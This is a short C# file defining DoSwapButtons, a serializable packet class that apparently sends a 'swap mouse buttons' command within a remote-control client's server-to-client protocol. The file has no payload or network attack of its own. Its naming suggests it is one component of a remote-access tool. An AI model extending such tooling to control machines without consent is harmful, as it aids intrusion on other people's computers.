using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoSwapButtons : IPacket
{
	public string Text { get; set; }

	public DoSwapButtons()
	{
	}

	public DoSwapButtons(string text)
	{
		Text = text;
	}

	public void Execute(Client client)
	{
		client.Send(this);
	}
}
